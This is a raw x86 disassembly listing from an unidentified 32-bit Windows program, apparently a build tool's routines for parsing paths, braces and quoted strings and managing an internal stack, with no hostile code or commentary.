  40d27d:	push   DWORD PTR ds:0x4216d4
  40d283:	call   0x405021
  40d288:	mov    edx,DWORD PTR ds:0x432650
  40d28e:	pop    ecx
  40d28f:	pop    ecx
  40d290:	mov    ecx,DWORD PTR ds:0x432654
  40d296:	mov    eax,DWORD PTR [ecx]
  40d298:	mov    DWORD PTR [edx],eax
  40d29a:	mov    eax,DWORD PTR [ecx+0x4]
  40d29d:	mov    DWORD PTR [edx+0x4],eax
  40d2a0:	add    edx,0x8
  40d2a3:	sub    ecx,0x8
  40d2a6:	mov    DWORD PTR ds:0x432650,edx
  40d2ac:	mov    DWORD PTR ds:0x432654,ecx
  40d2b2:	pop    ecx
  40d2b3:	ret    
  40d2b4:	push   ebx
  40d2b5:	push   esi
  40d2b6:	mov    esi,0x434660
  40d2bb:	push   edi
  40d2bc:	xor    edx,edx
  40d2be:	mov    cl,0x19
  40d2c0:	mov    DWORD PTR ds:0x432654,esi
  40d2c6:	mov    DWORD PTR ds:0x432650,0x432660
  40d2d0:	mov    BYTE PTR ds:0x432646,0x0
  40d2d7:	mov    BYTE PTR ds:0x432645,0x3
  40d2de:	mov    BYTE PTR ds:0x432647,0x19
  40d2e5:	call   0x40ce07
  40d2ea:	mov    ecx,DWORD PTR ds:0x432654
  40d2f0:	mov    eax,ds:0x432648
  40d2f5:	mov    DWORD PTR [ecx],eax
  40d2f7:	mov    edi,0x3ff
  40d2fc:	jmp    0x40d3a2
  40d301:	call   0x40cf7f
  40d306:	mov    edx,DWORD PTR ds:0x432648
  40d30c:	mov    ecx,DWORD PTR ds:0x432654
  40d312:	cmp    dl,0x19
  40d315:	jne    0x40d34e
  40d317:	cmp    ecx,0x435658
  40d31d:	jne    0x40d397
  40d31f:	push   0x412
  40d324:	push   DWORD PTR ds:0x4216d4
  40d32a:	call   0x405021
  40d32f:	pop    ecx
  40d330:	pop    ecx
  40d331:	mov    ecx,DWORD PTR ds:0x432654
  40d337:	jmp    0x40d3aa
  40d339:	test   bl,bl
  40d33b:	je     0x40d36f
  40d33d:	call   0x40d243
  40d342:	mov    edx,DWORD PTR ds:0x432648
  40d348:	mov    ecx,DWORD PTR ds:0x432654
  40d34e:	movzx  eax,dl
  40d351:	mov    bl,BYTE PTR [eax+0x411144]
  40d357:	movzx  eax,BYTE PTR [ecx]
  40d35a:	cmp    bl,BYTE PTR [eax+0x411144]
  40d360:	jbe    0x40d339
  40d362:	jmp    0x40d317
  40d364:	call   0x40d243
  40d369:	mov    ecx,DWORD PTR ds:0x432654
  40d36f:	cmp    BYTE PTR [ecx],0x19
  40d372:	jne    0x40d364
  40d374:	cmp    ecx,esi
  40d376:	jae    0x40d38c
  40d378:	push   edi
  40d379:	push   DWORD PTR ds:0x4216d4
  40d37f:	call   0x405021
  40d384:	pop    ecx
  40d385:	pop    ecx
  40d386:	mov    ecx,DWORD PTR ds:0x432654
  40d38c:	sub    ecx,0x8
  40d38f:	mov    DWORD PTR ds:0x432654,ecx
  40d395:	jmp    0x40d3aa
  40d397:	add    ecx,0x8
  40d39a:	mov    DWORD PTR ds:0x432654,ecx
  40d3a0:	mov    DWORD PTR [ecx],edx
  40d3a2:	mov    eax,ds:0x43264c
  40d3a7:	mov    DWORD PTR [ecx+0x4],eax
  40d3aa:	cmp    BYTE PTR ds:0x432646,0x0
  40d3b1:	je     0x40d301
  40d3b7:	sub    esi,0x8
  40d3ba:	cmp    ecx,esi
  40d3bc:	je     0x40d3cc
  40d3be:	push   edi
  40d3bf:	push   DWORD PTR ds:0x4216d4
  40d3c5:	call   0x405021
  40d3ca:	pop    ecx
  40d3cb:	pop    ecx
  40d3cc:	pop    edi
  40d3cd:	pop    esi
  40d3ce:	pop    ebx
  40d3cf:	jmp    0x40d18e
  40d3d4:	push   ebp
  40d3d5:	mov    ebp,esp
  40d3d7:	push   ecx
  40d3d8:	push   ecx
  40d3d9:	and    DWORD PTR [ebp-0x4],0x0
  40d3dd:	push   ebx
  40d3de:	push   edi
  40d3df:	lea    eax,[ebp-0x4]
  40d3e2:	push   eax
  40d3e3:	mov    ebx,0x401090
  40d3e8:	push   ebx
  40d3e9:	push   ecx
  40d3ea:	call   DWORD PTR ds:0x4373c8
  40d3f0:	add    esp,0xc
  40d3f3:	mov    edi,eax
  40d3f5:	lea    eax,[ebp-0x4]
  40d3f8:	push   eax
  40d3f9:	push   ebx
  40d3fa:	push   0x0
  40d3fc:	call   DWORD PTR ds:0x4373c8
  40d402:	add    esp,0xc
  40d405:	test   eax,eax
  40d407:	je     0x40d41d
  40d409:	push   edi
  40d40a:	push   0x409
  40d40f:	push   DWORD PTR ds:0x4216d4
  40d415:	call   0x405021
  40d41a:	add    esp,0xc
  40d41d:	test   edi,edi
  40d41f:	jne    0x40d433
  40d421:	push   0x417
  40d426:	push   DWORD PTR ds:0x4216d4
  40d42c:	call   0x405021
  40d431:	pop    ecx
  40d432:	pop    ecx
  40d433:	mov    ecx,edi
  40d435:	call   0x40a26b
  40d43a:	test   eax,eax
  40d43c:	pop    edi
  40d43d:	setne  al
  40d440:	pop    ebx
  40d441:	leave  
  40d442:	ret    
  40d443:	push   ecx
  40d444:	push   ebx
  40d445:	push   esi
  40d446:	mov    esi,ecx
  40d448:	mov    bl,dl
  40d44a:	cmp    WORD PTR [esi],0x0
  40d44e:	jne    0x40d462
  40d450:	push   0x3fa
  40d455:	push   DWORD PTR ds:0x4216d4
  40d45b:	call   0x405021
  40d460:	pop    ecx
  40d461:	pop    ecx
  40d462:	movzx  eax,bl
  40d465:	sub    eax,0x4
  40d468:	je     0x40d492
  40d46a:	dec    eax
  40d46b:	je     0x40d480
  40d46d:	dec    eax
  40d46e:	je     0x40d492
  40d470:	dec    eax
  40d471:	je     0x40d480
  40d473:	mov    DWORD PTR ds:0x432658,esi
  40d479:	call   0x40d2b4
  40d47e:	jmp    0x40d499
  40d480:	mov    ecx,esi
  40d482:	call   0x40d3d4
  40d487:	xor    ecx,ecx
  40d489:	test   al,al
  40d48b:	sete   cl
  40d48e:	mov    al,cl
  40d490:	jmp    0x40d499
  40d492:	mov    ecx,esi
  40d494:	call   0x40d3d4
  40d499:	pop    esi
  40d49a:	pop    ebx
  40d49b:	pop    ecx
  40d49c:	ret    
  40d49d:	push   ebp
  40d49e:	mov    ebp,esp
  40d4a0:	sub    esp,0x38
  40d4a3:	mov    eax,ds:0x4216c4
  40d4a8:	push   ebx
  40d4a9:	push   esi
  40d4aa:	mov    ebx,ecx
  40d4ac:	push   edi
  40d4ad:	mov    DWORD PTR [ebp-0x8],edx
  40d4b0:	mov    DWORD PTR [ebp-0x4],ebx
  40d4b3:	mov    DWORD PTR [ebp-0x14],eax
  40d4b6:	test   eax,eax
  40d4b8:	je     0x40d8d8
  40d4be:	push   0x22
  40d4c0:	mov    DWORD PTR [ebp-0x2c],0x7b
  40d4c7:	pop    edi
  40d4c8:	mov    DWORD PTR [ebp-0x24],0x7d
  40d4cf:	mov    DWORD PTR [ebp-0x18],0x5c
  40d4d6:	mov    DWORD PTR [ebp-0x1c],0x2f
  40d4dd:	mov    DWORD PTR [ebp-0x34],0x3a
  40d4e4:	mov    esi,DWORD PTR [eax+0x8]
  40d4e7:	push   0x2e
  40d4e9:	push   esi
  40d4ea:	mov    DWORD PTR [ebp-0xc],esi
  40d4ed:	call   DWORD PTR ds:0x43745c
  40d4f3:	mov    edx,DWORD PTR [ebp+0xc]
  40d4f6:	pop    ecx
  40d4f7:	pop    ecx
  40d4f8:	mov    ecx,eax
  40d4fa:	mov    DWORD PTR [ebp-0x28],eax
  40d4fd:	call   0x40f7e0
  40d502:	test   eax,eax
  40d504:	jne    0x40d8c8
  40d50a:	lea    ecx,[esi+0x2]
  40d50d:	mov    esi,ecx
  40d50f:	mov    WORD PTR [ebx],ax
  40d512:	movzx  eax,WORD PTR [esi]
  40d515:	mov    DWORD PTR [ebp-0x20],ecx
  40d518:	test   ax,ax
  40d51b:	je     0x40d655
  40d521:	push   0x5e
  40d523:	pop    edx
  40d524:	cmp    ax,WORD PTR [ebp-0x2c]
  40d528:	je     0x40d54c
  40d52a:	cmp    ax,dx
  40d52d:	jne    0x40d534
  40d52f:	add    esi,0x2
  40d532:	jmp    0x40d541
  40d534:	cmp    ax,di
  40d537:	jne    0x40d541
  40d539:	add    esi,0x2
  40d53c:	cmp    WORD PTR [esi],di
  40d53f:	jne    0x40d539
  40d541:	add    esi,0x2
  40d544:	movzx  eax,WORD PTR [esi]
  40d547:	test   ax,ax
  40d54a:	jne    0x40d524
  40d54c:	xor    edx,edx
  40d54e:	cmp    WORD PTR [esi],dx
  40d551:	je     0x40d657
  40d557:	push   0x5e
  40d559:	mov    ebx,esi
  40d55b:	pop    ecx
  40d55c:	movzx  eax,WORD PTR [ebx]
  40d55f:	cmp    ax,WORD PTR [ebp-0x24]
  40d563:	je     0x40d575
  40d565:	cmp    ax,cx
  40d568:	jne    0x40d56d
  40d56a:	add    ebx,0x2
  40d56d:	add    ebx,0x2
  40d570:	cmp    WORD PTR [ebx],dx
  40d573:	jne    0x40d55c
  40d575:	mov    eax,ebx
  40d577:	sub    eax,esi
  40d579:	sub    eax,0x2
  40d57c:	sar    eax,1
  40d57e:	mov    ecx,eax
  40d580:	mov    DWORD PTR [ebp-0x30],eax
  40d583:	mov    eax,DWORD PTR [ebp+0x8]
  40d586:	mov    DWORD PTR [ebp-0x10],ecx
  40d589:	mov    edx,eax
  40d58b:	cmp    WORD PTR [eax],di
  40d58e:	jne    0x40d593
  40d590:	lea    edx,[eax+0x2]
  40d593:	lea    edi,[esi+0x2]
  40d596:	test   ecx,ecx
  40d598:	je     0x40d5ee
  40d59a:	sub    edx,edi
  40d59c:	mov    DWORD PTR [ebp-0x28],edx
  40d59f:	movzx  eax,WORD PTR [edi]
  40d5a2:	cmp    ax,WORD PTR [ebp-0x18]
  40d5a6:	je     0x40d5ce
  40d5a8:	cmp    ax,WORD PTR [ebp-0x1c]
  40d5ac:	je     0x40d5ce
  40d5ae:	push   0x1
  40d5b0:	lea    eax,[edx+edi*1]
  40d5b3:	push   eax
  40d5b4:	push   edi
  40d5b5:	call   DWORD PTR ds:0x437414
  40d5bb:	add    esp,0xc
  40d5be:	test   eax,eax
  40d5c0:	jne    0x40d8c2
  40d5c6:	mov    ecx,DWORD PTR [ebp-0x10]
  40d5c9:	mov    edx,DWORD PTR [ebp-0x28]
  40d5cc:	jmp    0x40d5de
  40d5ce:	movzx  eax,WORD PTR [edx+edi*1]
  40d5d2:	cmp    ax,WORD PTR [ebp-0x18]
  40d5d6:	je     0x40d5de
  40d5d8:	cmp    ax,WORD PTR [ebp-0x1c]
  40d5dc:	jne    0x40d5eb
  40d5de:	dec    ecx
  40d5df:	add    edi,0x2
  40d5e2:	mov    DWORD PTR [ebp-0x10],ecx
  40d5e5:	test   ecx,ecx
  40d5e7:	jne    0x40d59f
  40d5e9:	jmp    0x40d5f7
  40d5eb:	or     ecx,0xffffffff
  40d5ee:	cmp    ecx,0xffffffff
  40d5f1:	je     0x40d8c2
  40d5f7:	mov    eax,DWORD PTR [ebp-0x30]
  40d5fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5fd:	inc    eax
  40d5fe:	push   0x5c
  40d600:	lea    edi,[ecx+eax*2]
  40d603:	pop    eax
  40d604:	push   eax
  40d605:	push   edi
  40d606:	mov    DWORD PTR [ebp-0x28],esi
  40d609:	call   DWORD PTR ds:0x437540
  40d60f:	pop    ecx
  40d610:	pop    ecx
  40d611:	test   eax,eax
  40d613:	jne    0x40d626
  40d615:	push   0x2f
  40d617:	pop    eax
  40d618:	push   eax
  40d619:	push   edi
  40d61a:	call   DWORD PTR ds:0x437540
  40d620:	pop    ecx
  40d621:	pop    ecx
  40d622:	test   eax,eax
  40d624:	je     0x40d64f
  40d626:	cmp    eax,edi
  40d628:	jne    0x40d8c2
  40d62e:	movzx  eax,WORD PTR [ebx-0x2]
  40d632:	mov    ebx,DWORD PTR [ebp-0x4]
  40d635:	push   0x5c
  40d637:	pop    ecx
  40d638:	cmp    ax,cx
  40d63b:	je     0x40d8c5
  40d641:	push   0x2f
  40d643:	pop    ecx
  40d644:	cmp    ax,cx
  40d647:	je     0x40d8c5
  40d64d:	jmp    0x40d652
  40d64f:	mov    ebx,DWORD PTR [ebp-0x4]
  40d652:	mov    ecx,DWORD PTR [ebp-0x20]
  40d655:	xor    edx,edx
  40d657:	mov    eax,DWORD PTR [ebp-0xc]
  40d65a:	push   0x7b
  40d65c:	pop    edi
  40d65d:	cmp    WORD PTR [eax],di
  40d660:	jne    0x40d767
  40d666:	mov    edi,ecx
  40d668:	mov    esi,edi
  40d66a:	cmp    WORD PTR [edi],dx
  40d66d:	je     0x40d68b
  40d66f:	push   0x5e
  40d671:	pop    ecx
  40d672:	movzx  eax,WORD PTR [esi]
  40d675:	cmp    ax,WORD PTR [ebp-0x24]
  40d679:	je     0x40d68b
  40d67b:	cmp    ax,cx
  40d67e:	jne    0x40d683
  40d680:	add    esi,0x2
  40d683:	add    esi,0x2
  40d686:	cmp    WORD PTR [esi],dx
  40d689:	jne    0x40d672
  40d68b:	sub    esi,edi
  40d68d:	sar    esi,1
  40d68f:	je     0x40d6b9
  40d691:	push   esi
  40d692:	push   edi
  40d693:	push   DWORD PTR [ebp-0x8]
  40d696:	push   ebx
  40d697:	call   DWORD PTR ds:0x43746c
  40d69d:	add    esp,0x10
  40d6a0:	lea    edi,[edi+esi*2]
  40d6a3:	add    edi,0x2
  40d6a6:	push   0x5c
  40d6a8:	pop    eax
  40d6a9:	mov    DWORD PTR [ebp-0xc],edi
  40d6ac:	cmp    WORD PTR [edi-0x4],ax
  40d6b0:	je     0x40d6ee
  40d6b2:	mov    WORD PTR [ebx+esi*2],ax
  40d6b6:	inc    esi
  40d6b7:	jmp    0x40d6ee
  40d6b9:	mov    eax,DWORD PTR [ebp+0x8]
  40d6bc:	push   0x22
  40d6be:	pop    ecx
  40d6bf:	cmp    WORD PTR [eax],cx
  40d6c2:	jne    0x40d6cf
  40d6c4:	push   0x3
  40d6c6:	pop    esi
  40d6c7:	push   esi
  40d6c8:	push   0x402688
  40d6cd:	jmp    0x40d6d8
  40d6cf:	push   0x2
  40d6d1:	pop    esi
  40d6d2:	push   esi
  40d6d3:	push   0x402690
  40d6d8:	push   DWORD PTR [ebp-0x8]
  40d6db:	push   ebx
  40d6dc:	call   DWORD PTR ds:0x43746c
  40d6e2:	add    esp,0x10
  40d6e5:	add    edi,0x2
  40d6e8:	push   0x5c
  40d6ea:	mov    DWORD PTR [ebp-0xc],edi
  40d6ed:	pop    eax
  40d6ee:	push   eax
  40d6ef:	push   DWORD PTR [ebp+0x8]
  40d6f2:	call   DWORD PTR ds:0x43745c
  40d6f8:	push   0x2f
  40d6fa:	mov    edi,eax
  40d6fc:	pop    eax
  40d6fd:	push   eax
  40d6fe:	push   DWORD PTR [ebp+0x8]
  40d701:	call   DWORD PTR ds:0x43745c
  40d707:	add    esp,0x10
  40d70a:	cmp    eax,edi
  40d70c:	jbe    0x40d710
  40d70e:	mov    edi,eax
  40d710:	test   edi,edi
  40d712:	je     0x40d735
  40d714:	lea    eax,[edi+0x2]
  40d717:	push   eax
  40d718:	mov    eax,DWORD PTR [ebp-0x8]
  40d71b:	sub    eax,esi
  40d71d:	push   eax
  40d71e:	lea    eax,[ebx+esi*2]
  40d721:	push   eax
  40d722:	call   DWORD PTR ds:0x4373d0
  40d728:	mov    eax,DWORD PTR [ebp+0xc]
  40d72b:	sub    eax,edi
  40d72d:	add    esp,0xc
  40d730:	sub    eax,0x2
  40d733:	jmp    0x40d75e
  40d735:	mov    eax,DWORD PTR [ebp+0x8]
  40d738:	push   0x22
  40d73a:	pop    ecx
  40d73b:	lea    edi,[eax+0x2]
  40d73e:	cmp    WORD PTR [eax],cx
  40d741:	je     0x40d745
  40d743:	mov    edi,eax
  40d745:	mov    eax,DWORD PTR [ebp-0x8]
  40d748:	sub    eax,esi
  40d74a:	push   edi
  40d74b:	push   eax
  40d74c:	lea    eax,[ebx+esi*2]
  40d74f:	push   eax
  40d750:	call   DWORD PTR ds:0x4373d0
  40d756:	mov    eax,DWORD PTR [ebp+0xc]
  40d759:	add    esp,0xc
  40d75c:	sub    eax,edi
  40d75e:	sar    eax,1
  40d760:	add    esi,eax
  40d762:	jmp    0x40d81a
  40d767:	cmp    WORD PTR [esi],dx
  40d76a:	je     0x40d8ba
  40d770:	mov    esi,DWORD PTR [ebp+0x8]
  40d773:	push   0x2e
  40d775:	push   esi
  40d776:	call   DWORD PTR ds:0x43745c
  40d77c:	pop    ecx
  40d77d:	pop    ecx
  40d77e:	mov    edi,eax
  40d780:	push   0x3a
  40d782:	movzx  eax,WORD PTR [edi]
  40d785:	pop    ecx
  40d786:	cmp    ax,cx
  40d789:	je     0x40d7c0
  40d78b:	push   0x5c
  40d78d:	pop    ecx
  40d78e:	push   0x2f
  40d790:	pop    edx
  40d791:	cmp    ax,cx
  40d794:	je     0x40d7ab
  40d796:	cmp    ax,dx
  40d799:	je     0x40d7ab
  40d79b:	cmp    edi,esi
  40d79d:	jbe    0x40d7ab
  40d79f:	sub    edi,0x2
  40d7a2:	movzx  eax,WORD PTR [edi]
  40d7a5:	cmp    ax,WORD PTR [ebp-0x34]
  40d7a9:	jne    0x40d791
  40d7ab:	movzx  eax,WORD PTR [edi]
  40d7ae:	push   0x3a
  40d7b0:	pop    esi
  40d7b1:	cmp    ax,si
  40d7b4:	je     0x40d7c0
  40d7b6:	cmp    ax,cx
  40d7b9:	je     0x40d7c0
  40d7bb:	cmp    ax,dx
  40d7be:	jne    0x40d7c3
  40d7c0:	add    edi,0x2
  40d7c3:	xor    edx,edx
  40d7c5:	mov    esi,DWORD PTR [ebp+0xc]
  40d7c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d7cb:	sub    esi,edi
  40d7cd:	sar    esi,1
  40d7cf:	mov    eax,edx
  40d7d1:	mov    DWORD PTR [ebp-0x10],eax
  40d7d4:	cmp    edi,ecx
  40d7d6:	je     0x40d7eb
  40d7d8:	push   0x22
  40d7da:	pop    edx
  40d7db:	cmp    WORD PTR [ecx],dx
  40d7de:	jne    0x40d7e9
  40d7e0:	xor    eax,eax
  40d7e2:	inc    eax
  40d7e3:	mov    WORD PTR [ebx],dx
  40d7e6:	mov    DWORD PTR [ebp-0x10],eax
  40d7e9:	xor    edx,edx
  40d7eb:	mov    ebx,DWORD PTR [ebp-0x8]
  40d7ee:	sub    ebx,eax
  40d7f0:	cmp    esi,ebx
  40d7f2:	jl     0x40d804
  40d7f4:	push   0x434
  40d7f9:	push   edx
  40d7fa:	call   0x405021
  40d7ff:	mov    eax,DWORD PTR [ebp-0x10]
  40d802:	pop    ecx
  40d803:	pop    ecx
  40d804:	mov    ecx,DWORD PTR [ebp-0x4]
  40d807:	push   esi
  40d808:	push   edi
  40d809:	lea    eax,[ecx+eax*2]
  40d80c:	push   ebx
  40d80d:	push   eax
  40d80e:	call   DWORD PTR ds:0x43746c
  40d814:	add    esp,0x10
  40d817:	add    esi,DWORD PTR [ebp-0x10]
  40d81a:	mov    ebx,DWORD PTR [ebp-0x28]
  40d81d:	mov    eax,DWORD PTR [ebp-0xc]
  40d820:	mov    edi,DWORD PTR [ebp-0x8]
  40d823:	sub    ebx,eax
  40d825:	sar    ebx,1
  40d827:	sub    edi,esi
  40d829:	cmp    ebx,edi
  40d82b:	jl     0x40d83e
  40d82d:	push   0x434
  40d832:	push   0x0
  40d834:	call   0x405021
  40d839:	mov    eax,DWORD PTR [ebp-0xc]
  40d83c:	pop    ecx
  40d83d:	pop    ecx
  40d83e:	push   ebx
  40d83f:	push   eax
  40d840:	mov    eax,DWORD PTR [ebp-0x4]
  40d843:	push   edi
  40d844:	lea    eax,[eax+esi*2]
  40d847:	push   eax
  40d848:	call   DWORD PTR ds:0x43746c
  40d84e:	mov    eax,DWORD PTR [ebp-0x4]
  40d851:	add    esp,0x10
  40d854:	push   0x22
  40d856:	pop    edi
  40d857:	cmp    WORD PTR [eax],di
  40d85a:	jne    0x40d891
  40d85c:	push   0x22
  40d85e:	lea    edi,[ebx+esi*1]
  40d861:	pop    ecx
  40d862:	cmp    WORD PTR [eax+edi*2-0x2],cx
  40d867:	je     0x40d88e
  40d869:	mov    eax,DWORD PTR [ebp-0x8]
  40d86c:	sub    eax,ebx
  40d86e:	sub    eax,esi
  40d870:	cmp    eax,0x1
  40d873:	jg     0x40d886
  40d875:	push   0x434
  40d87a:	push   0x0
  40d87c:	call   0x405021
  40d881:	pop    ecx
  40d882:	pop    ecx
  40d883:	push   0x22
  40d885:	pop    ecx
  40d886:	mov    eax,DWORD PTR [ebp-0x4]
  40d889:	inc    ebx
  40d88a:	mov    WORD PTR [eax+edi*2],cx
  40d88e:	push   0x22
  40d890:	pop    edi
  40d891:	xor    ecx,ecx
  40d893:	lea    eax,[ebx+esi*1]
  40d896:	mov    ebx,DWORD PTR [ebp-0x4]
  40d899:	push   ecx
  40d89a:	mov    WORD PTR [ebx+eax*2],cx
  40d89e:	push   ecx
  40d89f:	mov    ecx,ebx
  40d8a1:	call   0x40de55
  40d8a6:	test   eax,eax
  40d8a8:	jne    0x40d8e1
  40d8aa:	mov    edx,DWORD PTR [ebp+0x10]
  40d8ad:	mov    ecx,ebx
  40d8af:	call   0x407503
  40d8b4:	test   al,al
  40d8b6:	jne    0x40d8f6
  40d8b8:	jmp    0x40d8c8
  40d8ba:	mov    edi,DWORD PTR [ebp+0x8]
  40d8bd:	jmp    0x40d7c5
  40d8c2:	mov    ebx,DWORD PTR [ebp-0x4]
  40d8c5:	push   0x22
  40d8c7:	pop    edi
  40d8c8:	mov    eax,DWORD PTR [ebp-0x14]
  40d8cb:	mov    eax,DWORD PTR [eax]
  40d8cd:	mov    DWORD PTR [ebp-0x14],eax
  40d8d0:	test   eax,eax
  40d8d2:	jne    0x40d4e4
  40d8d8:	xor    eax,eax
  40d8da:	pop    edi
  40d8db:	pop    esi
  40d8dc:	pop    ebx
  40d8dd:	leave  
  40d8de:	ret    0xc
  40d8e1:	mov    ecx,DWORD PTR [eax+0x10]
  40d8e4:	mov    edx,DWORD PTR [eax+0x14]
  40d8e7:	mov    eax,DWORD PTR [ebp+0x10]
  40d8ea:	mov    DWORD PTR [eax+0x4],ecx
  40d8ed:	mov    DWORD PTR [eax+0x8],edx
  40d8f0:	mov    DWORD PTR [eax+0x14],ecx
  40d8f3:	mov    DWORD PTR [eax+0x18],edx
  40d8f6:	mov    eax,DWORD PTR [ebp-0x14]
  40d8f9:	jmp    0x40d8da
  40d8fb:	push   ebp
  40d8fc:	mov    ebp,esp
  40d8fe:	sub    esp,0x1c
  40d901:	mov    eax,ds:0x4216d0
  40d906:	push   ebx
  40d907:	push   esi
  40d908:	mov    esi,DWORD PTR ds:0x4216c4
  40d90e:	xor    ebx,ebx
  40d910:	push   edi
  40d911:	mov    DWORD PTR [ebp-0x8],ebx
  40d914:	mov    DWORD PTR [ebp-0x4],esi
  40d917:	mov    DWORD PTR ds:0x4216c4,ebx
  40d91d:	mov    DWORD PTR [ebp-0x18],eax
  40d920:	test   eax,eax
  40d922:	je     0x40dac1
  40d928:	mov    eax,DWORD PTR [eax+0x4]
  40d92b:	mov    ecx,eax
  40d92d:	mov    DWORD PTR [ebp-0x1c],eax
  40d930:	lea    edx,[ecx+0x2]
  40d933:	mov    ax,WORD PTR [ecx]
  40d936:	add    ecx,0x2
  40d939:	cmp    ax,bx
  40d93c:	jne    0x40d933
  40d93e:	sub    ecx,edx
  40d940:	sar    ecx,1
  40d942:	mov    DWORD PTR [ebp-0x14],ecx
  40d945:	mov    ebx,esi
  40d947:	test   esi,esi
  40d949:	je     0x40daae
  40d94f:	mov    edi,DWORD PTR [ebx+0x8]
  40d952:	push   0x7b
  40d954:	movzx  eax,WORD PTR [edi]
  40d957:	pop    edx
  40d958:	cmp    ax,dx
  40d95b:	jne    0x40d974
  40d95d:	cmp    ax,0x5e
  40d961:	jne    0x40d966
  40d963:	add    edi,0x2
  40d966:	add    edi,0x2
  40d969:	movzx  eax,WORD PTR [edi]
  40d96c:	cmp    eax,0x7d
  40d96f:	jne    0x40d95d
  40d971:	add    edi,0x2
  40d974:	push   ecx
  40d975:	push   edi
  40d976:	push   DWORD PTR [ebp-0x1c]
  40d979:	call   DWORD PTR ds:0x437414
  40d97f:	add    esp,0xc
  40d982:	test   eax,eax
  40d984:	jne    0x40daa1
  40d98a:	mov    eax,DWORD PTR [ebp-0x14]
  40d98d:	movzx  eax,WORD PTR [edi+eax*2]
  40d991:	cmp    eax,0x2e
  40d994:	je     0x40d9a2
  40d996:	push   0x7b
  40d998:	pop    ecx
  40d999:	cmp    ax,cx
  40d99c:	jne    0x40daa1
  40d9a2:	mov    ecx,DWORD PTR [ebx+0x4]
  40d9a5:	mov    edi,ebx
  40d9a7:	test   ecx,ecx
  40d9a9:	je     0x40d9b1
  40d9ab:	mov    eax,DWORD PTR [ebx]
  40d9ad:	mov    DWORD PTR [ecx],eax
  40d9af:	jmp    0x40d9b6
  40d9b1:	mov    esi,DWORD PTR [ebx]
  40d9b3:	mov    DWORD PTR [ebp-0x4],esi
  40d9b6:	mov    ecx,DWORD PTR [ebx]
  40d9b8:	test   ecx,ecx
  40d9ba:	je     0x40d9c2
  40d9bc:	mov    eax,DWORD PTR [ebx+0x4]
  40d9bf:	mov    DWORD PTR [ecx+0x4],eax
  40d9c2:	mov    ebx,DWORD PTR [ebx]
  40d9c4:	and    DWORD PTR [edi],0x0
  40d9c7:	mov    eax,ds:0x4216c4
  40d9cc:	mov    DWORD PTR [ebp-0x10],ebx
  40d9cf:	jmp    0x40d9e8
  40d9d1:	push   DWORD PTR [edi+0x8]
  40d9d4:	push   DWORD PTR [eax+0x8]
  40d9d7:	call   DWORD PTR ds:0x437548
  40d9dd:	pop    ecx
  40d9de:	pop    ecx
  40d9df:	test   eax,eax
  40d9e1:	je     0x40da49
  40d9e3:	mov    eax,DWORD PTR [ebp-0xc]
  40d9e6:	mov    eax,DWORD PTR [eax]
  40d9e8:	mov    DWORD PTR [ebp-0xc],eax
  40d9eb:	test   eax,eax
  40d9ed:	jne    0x40d9d1
  40d9ef:	mov    eax,DWORD PTR [edi+0xc]
  40d9f2:	mov    DWORD PTR [ebp-0xc],eax
  40d9f5:	test   eax,eax
  40d9f7:	je     0x40da33
  40d9f9:	mov    esi,eax
  40d9fb:	xor    ebx,ebx
  40d9fd:	mov    al,BYTE PTR [edi+0x14]
  40da00:	mov    ds:0x435674,al
  40da05:	test   al,al
  40da07:	je     0x40da11
  40da09:	mov    eax,DWORD PTR [edi+0x8]
  40da0c:	mov    ds:0x435678,eax
  40da11:	mov    ecx,DWORD PTR [esi+0x4]
  40da14:	push   ebx
  40da15:	push   ebx
  40da16:	push   ebx
  40da17:	push   ebx
  40da18:	push   ebx
  40da19:	lea    edx,[ebp-0x8]
  40da1c:	call   0x40dfe5
  40da21:	mov    esi,DWORD PTR [esi]
  40da23:	mov    BYTE PTR ds:0x435674,bl
  40da29:	test   esi,esi
  40da2b:	jne    0x40d9fd
  40da2d:	mov    esi,DWORD PTR [ebp-0x4]
  40da30:	mov    ebx,DWORD PTR [ebp-0x10]
  40da33:	mov    eax,DWORD PTR [ebp-0x8]
  40da36:	mov    DWORD PTR [edi+0x10],eax
  40da39:	and    DWORD PTR [ebp-0x8],0x0
  40da3d:	mov    eax,ds:0x4216c4
  40da42:	mov    ecx,0x4216c4
  40da47:	jmp    0x40da99
  40da49:	push   DWORD PTR [edi+0x8]
  40da4c:	call   DWORD PTR ds:0x43754c
  40da52:	mov    eax,DWORD PTR [edi+0xc]
  40da55:	pop    ecx
  40da56:	mov    DWORD PTR [ebp-0xc],eax
  40da59:	test   eax,eax
  40da5b:	je     0x40da8b
  40da5d:	mov    ebx,DWORD PTR ds:0x43265c
  40da63:	mov    esi,eax
  40da65:	mov    eax,DWORD PTR [esi]
  40da67:	mov    DWORD PTR [edi+0xc],eax
  40da6a:	push   DWORD PTR [esi+0x4]
  40da6d:	call   DWORD PTR ds:0x43754c
  40da73:	mov    DWORD PTR [esi],ebx
  40da75:	mov    ebx,esi
  40da77:	mov    esi,DWORD PTR [edi+0xc]
  40da7a:	pop    ecx
  40da7b:	test   esi,esi
  40da7d:	jne    0x40da65
  40da7f:	mov    esi,DWORD PTR [ebp-0x4]
  40da82:	mov    DWORD PTR ds:0x43265c,ebx
  40da88:	mov    ebx,DWORD PTR [ebp-0x10]
  40da8b:	push   edi
  40da8c:	call   DWORD PTR ds:0x43754c
  40da92:	pop    ecx
  40da93:	jmp    0x40daa3
  40da95:	mov    ecx,eax
  40da97:	mov    eax,DWORD PTR [ecx]
  40da99:	test   eax,eax
  40da9b:	jne    0x40da95
  40da9d:	mov    DWORD PTR [ecx],edi
  40da9f:	jmp    0x40daa3
  40daa1:	mov    ebx,DWORD PTR [ebx]
  40daa3:	mov    ecx,DWORD PTR [ebp-0x14]
  40daa6:	test   ebx,ebx
  40daa8:	jne    0x40d94f
  40daae:	mov    eax,DWORD PTR [ebp-0x18]
  40dab1:	push   0x0
  40dab3:	mov    eax,DWORD PTR [eax]
  40dab5:	mov    DWORD PTR [ebp-0x18],eax
  40dab8:	pop    ebx
  40dab9:	test   eax,eax
  40dabb:	jne    0x40d928
  40dac1:	test   esi,esi
  40dac3:	je     0x40db0b
  40dac5:	mov    edi,esi
  40dac7:	test   BYTE PTR ds:0x4114bc,0x1
  40dace:	je     0x40dae1
  40dad0:	push   DWORD PTR [esi+0x8]
  40dad3:	push   0xfa5
  40dad8:	push   ebx
  40dad9:	call   0x405021
  40dade:	add    esp,0xc
  40dae1:	push   DWORD PTR [esi+0x8]
  40dae4:	call   DWORD PTR ds:0x43754c
